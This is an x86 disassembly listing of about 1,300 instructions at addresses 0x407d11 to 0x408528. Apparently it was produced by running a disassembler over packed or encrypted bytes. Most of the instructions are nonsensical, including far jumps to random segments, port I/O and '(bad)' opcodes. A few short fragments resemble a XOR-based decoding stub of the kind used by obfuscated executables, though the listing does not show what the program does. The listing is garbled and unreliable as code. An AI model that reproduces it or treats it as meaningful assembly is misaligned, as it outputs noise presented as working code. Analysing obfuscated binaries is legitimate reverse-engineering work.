  407d11:	lods   eax,DWORD PTR ds:[esi]
  407d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d13:	rcl    BYTE PTR [ecx-0x25450c5b],1
  407d19:	idiv   ah
  407d1b:	dec    esp
  407d1c:	and    bl,cl
  407d1e:	cld    
  407d1f:	into   
  407d20:	jo     0x407d97
  407d22:	retw   0xb1a6
  407d26:	jecxz  0x407d24
  407d28:	cmp    bl,BYTE PTR [edi-0x64ceeb9]
  407d2e:	inc    eax
  407d2f:	adc    ah,BYTE PTR [ecx+0x4a216512]
  407d35:	cmp    eax,0x4579d086
  407d3a:	cs or  eax,0xd1efc768
  407d40:	xchg   BYTE PTR [edx+0x5a],bh
  407d43:	ret    0x38bd
  407d46:	fadd   st,st(4)
  407d48:	inc    esp
  407d49:	pushf  
  407d4a:	hlt    
  407d4b:	outs   dx,BYTE PTR ds:[esi]
  407d4c:	and    DWORD PTR [edx-0x2],ecx
  407d4f:	push   ecx
  407d50:	xlat   BYTE PTR ds:[ebx]
  407d51:	mov    esi,0x9d3ae4e8
  407d56:	icebp  
  407d57:	idiv   BYTE PTR [eax-0x6911b574]
  407d5d:	fisttp WORD PTR [ecx+ecx*1-0x7e347479]
  407d64:	loope  0x407d69
  407d66:	(bad)  
  407d67:	and    al,0xa7
  407d69:	icebp  
  407d6a:	imul   edx,DWORD PTR [edi+0x40],0xffffffcf
  407d6e:	out    dx,eax
  407d6f:	pop    ecx
  407d70:	aas    
  407d71:	mov    cl,BYTE PTR [ecx+0x4018a024]
  407d77:	je     0x407d4d
  407d79:	loop   0x407d9e
  407d7b:	sub    al,0x94
  407d7d:	pop    edi
  407d7e:	push   esi
  407d7f:	jecxz  0x407df9
  407d81:	inc    esi
  407d82:	dec    esi
  407d83:	mov    ds:0x9a32b3cb,eax
  407d88:	jecxz  0x407d68
  407d8a:	dec    eax
  407d8b:	xchg   DWORD PTR [edi],edi
  407d8d:	mov    esi,0xee54b0c5
  407d92:	xor    edi,DWORD PTR [esi+ebp*2+0x27]
  407d96:	jle    0x407dad
  407d98:	ss xchg edx,eax
  407d9a:	fst    st(7)
  407d9c:	popf   
  407d9d:	xor    BYTE PTR [edi-0x20],cl
  407da0:	jge    0x407dcc
  407da2:	xor    ecx,DWORD PTR ds:0x7c52e9ef
  407da8:	mov    esi,0xc25822d1
  407dad:	push   esi
  407dae:	sub    ah,0x43
  407db1:	std    
  407db2:	lods   eax,DWORD PTR ds:[esi]
  407db3:	sbb    eax,0x8579a404
  407db8:	or     BYTE PTR [ecx-0x69ec7672],bl
  407dbe:	or     DWORD PTR [ebx],0x69
  407dc1:	dec    edi
  407dc2:	push   edx
  407dc3:	push   0x57c6c5f2
  407dc8:	into   
  407dc9:	arpl   WORD PTR [ebx],dx
  407dcb:	or     dl,0x8f
  407dce:	add    eax,0x23dcc68
  407dd3:	or     DWORD PTR [ebx-0x7e],edi
  407dd6:	mov    eax,esi
  407dd8:	adc    eax,0x39c6e51a
  407ddd:	ss mov al,0x65
  407de0:	stos   BYTE PTR es:[edi],al
  407de1:	cmp    DWORD PTR [ebx+0x33],edx
  407de4:	ins    DWORD PTR es:[edi],dx
  407de5:	in     eax,dx
  407de6:	call   0x1fa4:0x9e2cb1ee
  407ded:	xor    eax,0x533ec2ec
  407df2:	pop    es
  407df3:	ja     0x407e59
  407df5:	sbb    ebp,DWORD PTR [edi+0x4d78216d]
  407dfb:	xor    eax,0x8a7943d6
  407e00:	pop    es
  407e01:	pop    edx
  407e02:	stos   DWORD PTR es:[edi],eax
  407e03:	sbb    DWORD PTR [ebx+0x749498b3],edi
  407e09:	leave  
  407e0a:	lea    edi,[ecx+0x59]
  407e0d:	bound  esp,QWORD PTR ds:0x37ac5749
  407e13:	push   eax
  407e14:	adc    ch,BYTE PTR [eax-0x3d5409f7]
  407e1a:	ja     0x407d9e
  407e1c:	or     al,0x9e
  407e1e:	popf   
  407e1f:	pop    es
  407e20:	loop   0x407de4
  407e22:	out    0x3f,al
  407e24:	adc    al,0x1a
  407e26:	das    
  407e27:	xlat   BYTE PTR ds:[ebx]
  407e28:	gs push 0x2b
  407e2b:	test   al,0x33
  407e2d:	in     eax,0x94
  407e2f:	rol    bl,cl
  407e31:	cmp    ecx,DWORD PTR [ebp-0x707b6cbb]
  407e37:	pop    ebp
  407e38:	(bad)  
  407e39:	out    dx,eax
  407e3a:	push   ecx
  407e3b:	cmp    edx,edx
  407e3d:	inc    edi
  407e3e:	sti    
  407e3f:	xchg   DWORD PTR [edi+0x69],ecx
  407e42:	mov    DWORD PTR [edx+0x11],eax
  407e45:	jb     0x407e2b
  407e47:	push   esp
  407e48:	add    ecx,DWORD PTR [ebp+0x52]
  407e4b:	outs   dx,BYTE PTR ds:[esi]
  407e4c:	mov    ds:0x2b5e926b,eax
  407e51:	adc    al,0x0
  407e53:	aam    0x93
  407e55:	mov    eax,ds:0xf0558f4b
  407e5a:	cdq    
  407e5b:	cmp    BYTE PTR [edi+0x6],dh
  407e5e:	xchg   ebp,ecx
  407e60:	repnz adc ecx,esp
  407e63:	dec    esp
  407e64:	cmp    bh,BYTE PTR [edx+0x557e4bf9]
  407e6a:	xchg   esp,eax
  407e6b:	jg     0x407ee3
  407e6d:	sub    DWORD PTR [ecx+0x5cff3691],ebx
  407e73:	adc    al,0xf
  407e75:	xchg   DWORD PTR [eax],ecx
  407e77:	add    BYTE PTR [eax],al
  407e79:	add    BYTE PTR [ebx-0x11162bab],cl
  407e7f:	or     BYTE PTR [eax],al
  407e81:	add    BYTE PTR [ebx+0x7d8bcc55],cl
  407e87:	cld    
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	stos   BYTE PTR es:[edi],al
  407e9e:	inc    eax
  407e9f:	or     eax,0x7ecd119a
  407ea4:	jle    0x407e30
  407ea6:	jg     0x407f26
  407ea8:	jle    0x407ec5
  407eaa:	aas    
  407eab:	fcmovb st,st(7)
  407ead:	into   
  407eae:	mov    ebx,0x304c1a97
  407eb3:	and    dh,ch
  407eb5:	test   DWORD PTR [ecx],0x6d04f3d3
  407ebb:	out    0x1e,al
  407ebd:	or     eax,0x11661596
  407ec2:	aaa    
  407ec3:	cmp    ebp,DWORD PTR [eax+0x24]
  407ec6:	iret   
  407ec7:	(bad)
  407eca:	ins    DWORD PTR es:[edi],dx
  407ecb:	mov    al,ds:0xaa66523c
  407ed0:	dec    eax
  407ed1:	sahf   
  407ed2:	adc    BYTE PTR [edi],0x3c
  407ed5:	imul   ecx,DWORD PTR [ecx-0x32eef596],0xe494476c
  407edf:	inc    ebx
  407ee0:	cmp    BYTE PTR cs:[edi+0x66],ah
  407ee4:	enter  0x74b6,0xe8
  407ee8:	ret    0xda11
  407eeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eec:	xor    DWORD PTR [esi-0x80740e1],0x6e091ac1
  407ef6:	into   
  407ef7:	sbb    eax,DWORD PTR [edx-0x649479c0]
  407efd:	xor    eax,0x89187c3c
  407f02:	shl    dl,cl
  407f04:	ss mov dl,0x38
  407f07:	adc    BYTE PTR [eax-0xd2528d2],dh
  407f0d:	mov    ds:0x984921c8,eax
  407f12:	mov    eax,ds:0x54f24187
  407f17:	shr    DWORD PTR [ebx-0x13d50e81],cl
  407f1d:	xchg   BYTE PTR [ebp+0x4dad98b8],ah
  407f23:	int    0xf4
  407f25:	fcmovnb st,st(1)
  407f27:	add    DWORD PTR [edx],edx
  407f29:	clc    
  407f2a:	push   esi
  407f2b:	fdivrp st(6),st
  407f2d:	jnp    0x407f5f
  407f2f:	inc    edx
  407f30:	xor    al,0x79
  407f32:	test   ebp,edi
  407f34:	fmul   QWORD PTR [eax+0x55582a6a]
  407f3a:	xchg   edx,eax
  407f3b:	push   esp
  407f3c:	fdivr  DWORD PTR [edi-0x6729364c]
  407f42:	dec    ebx
  407f43:	nop
  407f44:	ficomp DWORD PTR ds:0x6bfc8f7d
  407f4a:	lahf   
  407f4b:	daa    
  407f4c:	or     al,0x5c
  407f4e:	scas   al,BYTE PTR es:[edi]
  407f4f:	dec    ecx
  407f50:	sbb    DWORD PTR [ecx+0x5e],ebp
  407f53:	cld    
  407f54:	push   esp
  407f55:	sbb    DWORD PTR [ebx],ecx
  407f57:	hlt    
  407f58:	mov    ds:0x31b3700c,al
  407f5d:	push   ebx
  407f5e:	test   al,0x71
  407f60:	cmp    ebp,DWORD PTR [esi-0x6e]
  407f63:	mov    bh,0xbe
  407f65:	aad    0xef
  407f67:	lods   al,BYTE PTR es:[esi]
  407f69:	ins    DWORD PTR es:[edi],dx
  407f6a:	in     eax,dx
  407f6b:	test   al,0x3b
  407f6d:	sub    eax,0xa8e3fae5
  407f72:	inc    eax
  407f73:	adc    BYTE PTR [edx],0xad
  407f76:	les    ebx,FWORD PTR [edi]
  407f78:	arpl   WORD PTR [ebx-0x48],sp
  407f7b:	pop    eax
  407f7c:	imul   esi,DWORD PTR [eax+edx*4+0x59391489],0xffffffc2
  407f84:	in     eax,0x10
  407f86:	cmp    esp,DWORD PTR [ecx+0x45]
  407f89:	push   cs
  407f8a:	pop    eax
  407f8c:	xchg   esi,eax
  407f8d:	xchg   DWORD PTR [esi],eax
  407f8f:	xor    BYTE PTR [ebp+0x418eee2],cl
  407f95:	out    dx,al
  407f96:	retf   
  407f97:	test   DWORD PTR [ebx+eax*2-0x5654ff7c],edi
  407f9e:	das    
  407f9f:	push   esi
  407fa0:	sub    ebp,ebp
  407fa2:	sub    ebp,edx
  407fa4:	xchg   esp,eax
  407fa5:	or     DWORD PTR [edi],ebp
  407fa7:	sub    eax,0x8ddcbf36
  407fac:	and    eax,0x17d7b60c
  407fb1:	jne    0x407fe1
  407fb3:	ins    BYTE PTR es:[edi],dx
  407fb4:	jl     0x407f69
  407fb6:	or     ebp,edi
  407fb8:	mov    WORD PTR [ebp-0x4c9d948],es
  407fbe:	ja     0x407f5c
  407fc0:	lock dec ebp
  407fc2:	sar    ebp,0x4f
  407fc5:	xor    eax,0x1cf138b2
  407fca:	test   BYTE PTR [ebp-0x13],dl
  407fcd:	adc    BYTE PTR [ebx+0xe],0x34
  407fd1:	bound  esp,QWORD PTR [ebp*8-0x71c8705e]
  407fd8:	ds cmc 
  407fda:	add    ebp,edi
  407fdc:	xor    eax,0x4534b704
  407fe1:	in     al,0x17
  407fe3:	retf   0x707d
  407fe6:	test   DWORD PTR [edi-0x42],ebp
  407fe9:	jp     0x407fb8
  407feb:	ins    DWORD PTR es:[edi],dx
  407fec:	push   esp
  407fed:	dec    ebx
  407fee:	xor    bl,ch
  407ff0:	(bad)  
  407ff1:	adc    BYTE PTR [ecx],ch
  407ff3:	pop    ebx
  407ff4:	nop
  407ff5:	xchg   edx,eax
  407ff6:	xchg   edx,eax
  407ff7:	pop    ds
  407ff8:	adc    ecx,edi
  407ffa:	adc    BYTE PTR [edx],dl
  407ffc:	call   0x11413a12
  408001:	outs   dx,BYTE PTR ds:[esi]
  408002:	aam    0xf2
  408004:	push   ds
  408005:	les    ebp,FWORD PTR [edx+0x7c97576c]
  40800b:	hlt    
  40800c:	mov    ds:0x25bb3129,al
  408011:	pusha  
  408012:	call   0x392189a
  408017:	cmp    esp,DWORD PTR [ebx-0x703fdae4]
  40801d:	lock jne 0x40807a
  408020:	and    al,0xb0
  408022:	leave  
  408023:	or     al,0xc7
  408025:	mov    esi,0xe4d2e972
  40802a:	pause  
  40802c:	loop   0x408070
  40802e:	add    BYTE PTR [ebx-0x12],0x56
  408032:	add    DWORD PTR [ebp+0x57],ebx
  408035:	call   0xda11:0x215ded07
  40803c:	jmp    0xaf0f:0xd103f903
  408043:	xlat   BYTE PTR ds:[ebx]
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	xor    al,BYTE PTR [ebx+0x67]
  40807c:	repnz lods eax,DWORD PTR ds:[esi]
  40807e:	retf   0x7e7e
  408081:	mov    bh,BYTE PTR [edi+0x7e]
  408084:	jle    0x4080fe
  408086:	pop    ecx
  408087:	push   0xdea2f45d
  40808c:	jmp    FWORD PTR [esi+0x2]
  40808f:	mov    al,0x2d
  408091:	and    bh,BYTE PTR [eax]
  408093:	fist   DWORD PTR [ecx]
  408095:	call   0xaa360fc6
  40809a:	and    DWORD PTR [ebp+0x7cc807c6],0x7
  4080a1:	add    ebx,DWORD PTR [esi]
  4080a3:	adc    eax,0xbb8c1582
  4080a8:	xor    eax,DWORD PTR [eax]
  4080aa:	or     esp,edx
  4080ac:	jl     0x408092
  4080ae:	out    0x99,al
  4080b0:	sbb    eax,ebp
  4080b2:	int    0xf7
  4080b4:	add    ah,BYTE PTR [ebx+0x11bd215a]
  4080ba:	loop   0x408060
  4080bc:	je     0x4080d9
  4080be:	jmp    0x40811d
  4080c0:	out    0x60,al
  4080c2:	xchg   ebx,eax
  4080c3:	fiadd  DWORD PTR [ecx]
  4080c5:	sti    
  4080c6:	out    0xef,al
  4080c8:	outs   dx,DWORD PTR ds:[esi]
  4080c9:	jmp    0x418d92c8
  4080ce:	ja     0x408097
  4080d0:	sub    edi,eax
  4080d2:	and    BYTE PTR [esi-0x1c],0x1c
  4080d6:	shl    DWORD PTR [edi-0x55],cl
  4080d9:	dec    edi
  4080da:	pop    ss
  4080db:	mov    dh,0xc5
  4080dd:	mov    fs,WORD PTR [eax+0x3d]
  4080e0:	mov    bh,0xc
  4080e2:	sbb    DWORD PTR [ebx-0x7e],edx
  4080e5:	adc    DWORD PTR [ebp-0x233f700b],ebx
  4080eb:	lock cmp eax,DWORD PTR [eax+0x76]
  4080ef:	repnz lea ebx,[ecx+edx*4-0x650d020c]
  4080f7:	sub    BYTE PTR [ebp-0x7b],bl
  4080fa:	sub    al,0xe3
  4080fc:	inc    ebx
  4080fd:	leave  
  4080fe:	and    DWORD PTR [ecx-0x76b05a16],edi
  408104:	shl    BYTE PTR [ecx],cl
  408106:	loop   0x408156
  408108:	sti    
  408109:	and    cl,bl
  40810b:	xchg   edi,eax
  40810c:	mov    cl,al
  40810e:	jmp    0x72237de0
  408113:	xor    al,0x62
  408115:	jmp    0xcd3f89ed
  40811a:	cdq    
  40811b:	inc    edi
  40811c:	jno    0x408181
  40811e:	push   es
  40811f:	jb     0x4080af
  408121:	inc    ebx
  408122:	gs dec ebp
  408124:	and    al,0xfe
  408126:	lods   eax,DWORD PTR ds:[esi]
  408127:	addr16 data16 jo 0x4081a1
  40812b:	cld    
  40812c:	sbb    DWORD PTR [edx],0x47
  40812f:	lock adc al,0x43
  408132:	jle    0x4080e1
  408134:	ret    0x2f08
  408137:	nop
  408138:	pop    ss
  408139:	(bad)  
  40813a:	call   0x164ffc20
  40813f:	sub    al,0x6e
  408141:	inc    edx
  408142:	xchg   ebp,eax
  408143:	shl    BYTE PTR [ebx-0x2cbd1e3],1
  408149:	jbe    0x40812c
  40814b:	ins    DWORD PTR es:[edi],dx
  40814c:	push   0x1a
  40814e:	adc    eax,0xfce02a81
  408153:	imul   esi,edx,0xffffff81
  408156:	cs js  0x4080fb
  408159:	sbb    al,0xec
  40815b:	in     eax,0x9
  40815d:	idiv   BYTE PTR [ebx-0x5f349ee6]
  408163:	retf   0xa985
  408166:	jg     0x4080ff
  408168:	push   DWORD PTR ss:[ebx]
  40816b:	clc    
  40816c:	jmp    0x408155
  40816e:	jo     0x4081ad
  408170:	loope  0x408150
  408172:	in     eax,0x2e
  408174:	repnz (bad) 
  408177:	fstp   TBYTE PTR ds:0xc50cfea9
  40817d:	pushf  
  40817e:	xchg   BYTE PTR [ecx],cl
  408180:	mov    eax,ds:0x29396076
  408185:	inc    eax
  408186:	xor    al,0x68
  408188:	xor    al,0xf5
  40818a:	pop    ecx
  40818b:	sub    DWORD PTR [ebx],eax
  40818d:	push   ds
  40818e:	sbb    al,0x84
  408190:	out    0x67,al
  408192:	(bad)  
  408193:	ficom  DWORD PTR [eax-0x59]
  408196:	jo     0x40820c
  408198:	pop    edx
  408199:	xor    BYTE PTR [ebx],ch
  40819b:	gs add al,0xd8
  40819e:	scas   eax,DWORD PTR es:[edi]
  40819f:	(bad)  
  4081a0:	sub    edx,DWORD PTR [edi+0x4b]
  4081a3:	ds call 0xd75f:0x761765b2
  4081ab:	adc    BYTE PTR [ebp+0x1d],dl
  4081ae:	scas   al,BYTE PTR es:[edi]
  4081af:	in     al,dx
  4081b0:	in     eax,0x6d
  4081b2:	in     eax,0xda
  4081b4:	clc    
  4081b5:	add    eax,0x8ff360ec
  4081ba:	scas   eax,DWORD PTR es:[edi]
  4081bb:	punpckhwd mm3,QWORD PTR [edi+0x28c2dbf0]
  4081c2:	(bad)  
  4081c3:	xor    eax,0xf011c9f0
  4081c8:	aas    
  4081c9:	pop    ecx
  4081ca:	dec    ebx
  4081cb:	(bad)
  4081ce:	rcl    BYTE PTR [eax+0x74],0x2d
  4081d2:	mov    ch,0xbe
  4081d4:	enter  0x8f13,0xf5
  4081d8:	adc    DWORD PTR [esi-0x5f582253],eax
  4081de:	imul   ebp,ecx,0xb4d7bf77
  4081e4:	fldcw  WORD PTR [ebx+0x39f32afb]
  4081ea:	hlt    
  4081eb:	cdq    
  4081ec:	push   0x4e
  4081ee:	adc    ebp,DWORD PTR [edi+eax*1-0x1]
  4081f2:	xchg   ebp,eax
  4081f3:	sbb    dh,BYTE PTR [ebp+0x14]
  4081f6:	jecxz  0x40822b
  4081f8:	enter  0xb30f,0x9c
  4081fc:	push   eax
  4081fd:	das    
  4081fe:	push   cs
  4081ff:	sar    ecx,1
  408201:	and    al,0x2c
  408203:	pop    edx
  408204:	mov    ah,BYTE PTR ds:0xfd8d77b6
  40820a:	iret   
  40820b:	sbb    esi,DWORD PTR [ebx-0x48ac73de]
  408211:	mov    al,0x44
  408213:	mov    al,0x38
  408215:	shl    BYTE PTR [esp+ebp*1],cl
  408218:	adc    BYTE PTR [ebx],al
  40821a:	shr    ecx,1
  40821c:	lods   al,BYTE PTR ds:[esi]
  40821d:	add    DWORD PTR [eax],eax
  40821f:	add    BYTE PTR [eax+edx*1+0x3f],cl
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x3938:0x6258af62
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x408288
  408239:	lahf   
  40823a:	or     BYTE PTR [eax+ebx*8-0x60],dl
  40823e:	inc    esp
  40823f:	in     eax,0xd5
  408241:	mov    ebp,0x61a22738
  408246:	mov    bl,0xc2
  408248:	les    eax,FWORD PTR cs:[edi+0x622ba8ff]
  40824f:	adc    WORD PTR [edx+0x14],cx
  408253:	pop    es
  408254:	sub    eax,0x4ce0dbc3
  408259:	cdq    
  40825a:	lds    ebp,FWORD PTR [ebp-0x64edeeee]
  408260:	and    DWORD PTR [eax-0x2cd7e72f],ebp
  408266:	xchg   esp,ebp
  408268:	lahf   
  408269:	(bad)  [edx-0x2c]
  40826c:	xor    DWORD PTR [edx-0x59],ebx
  40826f:	ret    
  408270:	lods   al,BYTE PTR ds:[esi]
  408271:	pop    ecx
  408272:	cmp    DWORD PTR [esp+ecx*4-0x29],0x5a
  408277:	inc    ebp
  408278:	inc    ebp
  408279:	and    dh,BYTE PTR [esi]
  40827b:	gs push edx
  40827d:	mov    WORD PTR [ecx],es
  40827f:	jne    0x40825a
  408281:	add    al,0xd7
  408283:	into   
  408284:	push   ss
  408285:	jo     0x4082d9
  408287:	push   eax
  408288:	push   ds
  408289:	sbb    BYTE PTR [edi-0x11],bh
  40828c:	or     BYTE PTR ds:0xb6ea8b98,dl
  408292:	jle    0x40827d
  408294:	daa    
  408295:	popa   
  408296:	sub    esi,DWORD PTR [ecx+esi*8-0x320f10ee]
  40829d:	out    0x89,eax
  40829f:	cmp    BYTE PTR cs:[edi],cl
  4082a2:	ret    
  4082a3:	mov    eax,0x5d467dfc
  4082a8:	xlat   BYTE PTR ds:[ebx]
  4082a9:	add    ebp,esi
  4082ab:	fnstenvw [ebp+0x3e]
  4082af:	jl     0x408330
  4082b1:	pop    edx
  4082b2:	cmp    edi,esp
  4082b4:	mov    dh,BYTE PTR [eax+esi*4]
  4082b7:	mov    WORD PTR [ebp-0xdda782a],?
  4082bd:	mov    si,0x34b3
  4082c1:	ins    DWORD PTR es:[edi],dx
  4082c2:	not    DWORD PTR [edx+0x312511b3]
  4082c8:	inc    eax
  4082c9:	mov    ecx,0xcf81cf8b
  4082ce:	sub    DWORD PTR [edi+0x33],edx
  4082d1:	lods   al,BYTE PTR ds:[esi]
  4082d2:	and    DWORD PTR [ecx-0x50],0x9da71e43
  4082d9:	jbe    0x40826f
  4082db:	imul   edx,DWORD PTR [ecx+edx*8],0x72
  4082df:	mov    BYTE PTR [esi],dl
  4082e1:	cmp    al,0x1b
  4082e3:	(bad)  
  4082e4:	mov    eax,0xd02094a4
  4082e9:	jmp    0x9150:0xd5639c70
  4082f0:	ds sbb ecx,eax
  4082f3:	jmp    0x4082d2
  4082f5:	test   BYTE PTR [ecx],dh
  4082f7:	adc    al,0x1b
  4082f9:	popf   
  4082fa:	push   0x26ce5ef2
  4082ff:	mov    dh,BYTE PTR [ebx-0x1c8ac448]
  408305:	fnstenv [ebx+0x64]
  408308:	mov    edi,0x466737ff
  40830d:	retf   
  40830e:	jo     0x408308
  408310:	loopne 0x4082a6
  408312:	ja     0x408318
  408314:	loope  0x4082a8
  408316:	(bad)
  408319:	cmp    eax,0x44e304d3
  40831e:	xchg   BYTE PTR [ebx],ah
  408320:	test   edi,ecx
  408322:	mov    eax,ds:0xedd4f3d0
  408328:	push   edi
  408329:	aam    0x6
  40832b:	cs repnz (bad) 
  40832e:	fbld   TBYTE PTR [edx]
  408330:	int3   
  408331:	popa   
  408332:	sar    edx,cl
  408334:	dec    esi
  408335:	repz out dx,al
  408337:	sbb    eax,0xe7e85a1b
  40833c:	arpl   WORD PTR [edi-0x2a078d41],dx
  408342:	imul   ebx,eax,0x9a54517c
  408348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408349:	fcomi  st,st(2)
  40834b:	bound  edx,QWORD PTR [ebx-0x5d60ef68]
  408351:	sub    BYTE PTR [bp+0x3947],ch
  408356:	jecxz  0x4082e5
  408358:	pop    ds
  408359:	cmp    DWORD PTR [ebx+0x7a],esp
  40835c:	or     edx,DWORD PTR [ebx*4+0xe364235]
  408363:	arpl   WORD PTR [edi-0x6c],di
  408366:	pop    edx
  408367:	dec    edi
  408368:	repnz sahf 
  40836a:	fbld   TBYTE PTR [edi-0x28]
  40836d:	iret   
  40836e:	adc    DWORD PTR [edx-0x5e],esi
  408371:	jmp    0x5412:0x5c0dedcb
  408378:	xor    al,BYTE PTR [ebp-0x10]
  40837b:	sbb    eax,0x6c635922
  408380:	ret    0x6423
  408383:	ins    BYTE PTR es:[edi],dx
  408384:	sub    DWORD PTR [ebp+0x3cc549b6],esi
  40838a:	inc    ecx
  40838b:	add    DWORD PTR ss:0xcfc98f33,0xffffffe7
  408393:	sti    
  408394:	aad    0x6e
  408396:	sbb    ebx,DWORD PTR [eax-0x2940420]
  40839c:	(bad)  
  40839d:	out    0x2,al
  40839f:	into   
  4083a0:	cdq    
  4083a1:	pusha  
  4083a2:	fcom   DWORD PTR [ebp-0x1f9bdfff]
  4083a8:	je     0x408368
  4083aa:	ret    
  4083ab:	push   edi
  4083ac:	sbb    BYTE PTR [ebp-0x69],ch
  4083af:	mov    edx,DWORD PTR [eax+0x305c6521]
  4083b5:	dec    esi
  4083b6:	dec    eax
  4083b7:	pop    ds
  4083b8:	push   ds
  4083b9:	test   al,0x55
  4083bb:	mov    BYTE PTR [edx-0x77],ah
  4083be:	adc    al,0x44
  4083c0:	leave  
  4083c1:	clc    
  4083c2:	pusha  
  4083c3:	jmp    0xfbf3:0x519ece6d
  4083ca:	retf   0xf0e
  4083cd:	scas   eax,DWORD PTR es:[edi]
  4083ce:	xlat   BYTE PTR ds:[ebx]
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	popa   
  4083e9:	add    esi,DWORD PTR [ebx]
  4083eb:	leave  
  4083ec:	push   ebp
  4083ed:	leave  
  4083ee:	jle    0x40846e
  4083f0:	mov    bh,BYTE PTR [edi+0x7e]
  4083f3:	jle    0x408437
  4083f5:	sbb    al,0xf5
  4083f7:	fbld   TBYTE PTR [eax]
  4083f9:	push   eax
  4083fa:	sub    DWORD PTR [edi],ebp
  4083fc:	or     al,0xe2
  4083fe:	dec    ebp
  4083ff:	rol    BYTE PTR [eax-0x5f],cl
  408402:	lods   eax,DWORD PTR ds:[esi]
  408403:	mov    bh,ah
  408405:	(bad)  
  408406:	out    dx,al
  408407:	mov    edx,0xf5d664d8
  40840c:	inc    ebx
  40840d:	ret    
  40840e:	dec    esi
  40840f:	daa    
  408410:	mov    dh,0x24
  408412:	fs xchg ebx,eax
  408414:	stos   BYTE PTR es:[edi],al
  408415:	or     DWORD PTR [edi+esi*2],esi
  408418:	mov    ah,0xc5
  40841a:	out    0x90,eax
  40841c:	cmc    
  40841d:	into   
  40841e:	push   ss
  40841f:	xor    cl,BYTE PTR [ecx]
  408421:	ret    
  408422:	dec    ebp
  408423:	clc    
  408424:	mov    ch,0x6b
  408426:	leave  
  408427:	sub    BYTE PTR [ebx+0x78d5092e],dl
  40842d:	mov    ah,0xdc
  40842f:	hlt    
  408430:	push   esp
  408431:	push   ebp
  408432:	mov    cl,0xb1
  408434:	lock mov ecx,0x8965f497
  40843a:	sub    eax,0x536e2119
  40843f:	mov    ebx,0x9e9e47a7
  408444:	xchg   BYTE PTR [edi],bl
  408446:	das    
  408447:	dec    edx
  408448:	rol    DWORD PTR [edi-0x24f1af18],1
  40844e:	into   
  40844f:	outs   dx,DWORD PTR ds:[esi]
  408450:	mov    esi,0x94106c8f
  408455:	sbb    eax,0x4a13c521
  40845a:	leave  
  40845b:	xchg   edi,eax
  40845c:	repz sahf 
  40845e:	or     DWORD PTR [edx+0x34d1c556],esi
  408464:	das    
  408465:	test   eax,0xcf3b3047
  40846a:	imul   BYTE PTR [edi]
  40846c:	call   0x831c:0xdfe31b81
  408473:	sti    
  408474:	or     ah,BYTE PTR [edx+0x3e]
  408477:	mov    dh,0xfe
  408479:	jns    0x4084dc
  40847b:	pusha  
  40847c:	fcom   DWORD PTR ds:0x3804b8ef
  408482:	lods   eax,DWORD PTR ds:[esi]
  408483:	mov    ebp,0xefa7bd18
  408488:	cmp    al,dl
  40848a:	fwait
  40848b:	pop    ds
  40848c:	xor    al,0x27
  40848e:	push   ss
  40848f:	jmp    0xcb99c4b3
  408494:	outs   dx,DWORD PTR gs:[esi]
  408496:	push   ebx
  408497:	or     eax,0x603aa4b0
  40849c:	pop    ss
  40849d:	enter  0x2cde,0xd4
  4084a1:	xchg   edi,eax
  4084a2:	add    DWORD PTR [edi-0x38aea5e6],ebp
  4084a8:	inc    ecx
  4084a9:	mov    edi,0xac5c664b
  4084ae:	das    
  4084af:	mov    ds:0xc55c0d1e,al
  4084b4:	ficom  DWORD PTR [ecx]
  4084b6:	and    eax,0x49e823ce
  4084bb:	cmc    
  4084bc:	outs   dx,DWORD PTR ds:[esi]
  4084bd:	sbb    eax,0x27029063
  4084c2:	push   0x14e0ae74
  4084c7:	mov    ah,0xb1
  4084c9:	pop    es
  4084ca:	sub    BYTE PTR [ecx],dl
  4084cc:	mov    esp,0x777440da
  4084d1:	sub    bl,al
  4084d3:	adc    ch,BYTE PTR [esi+edx*4+0x48854bc9]
  4084da:	inc    BYTE PTR [ecx]
  4084dc:	das    
  4084dd:	mov    ebx,0x6f1dbf3e
  4084e2:	jg     0x408501
  4084e4:	cmp    dh,BYTE PTR [ebx+0x2e959d50]
  4084ea:	push   cs
  4084eb:	mov    BYTE PTR [ebp+0x30ab536a],dh
  4084f1:	lods   al,BYTE PTR ss:[esi]
  4084f3:	imul   ecx,DWORD PTR [edi+0x5f],0x6b
  4084f7:	and    DWORD PTR [eax],esp
  4084f9:	pushf  
  4084fa:	lods   eax,DWORD PTR ds:[esi]
  4084fb:	xchg   esp,edi
  4084fd:	push   eax
  4084fe:	push   ecx
  4084ff:	push   ss
  408500:	ja     0x4084c1
  408502:	xor    ch,BYTE PTR [ecx-0x6c]
  408505:	push   ebx
  408506:	cld    
  408507:	stos   BYTE PTR es:[edi],al
  408508:	aad    0xe7
  40850a:	in     al,dx
  40850b:	cli    
  40850c:	bound  eax,QWORD PTR [edi-0x2c256cc0]
  408512:	jno    0x408545
  408514:	inc    ecx
  408515:	push   cs
  408516:	add    bl,BYTE PTR [ebp+0x705458df]
  40851c:	cli    
  40851d:	not    BYTE PTR ds:0x26b56f73
  408523:	in     al,dx
  408524:	lods   al,BYTE PTR ds:[esi]
  408525:	dec    esi
  408526:	jno    0x40853a
  408528:	icebp  
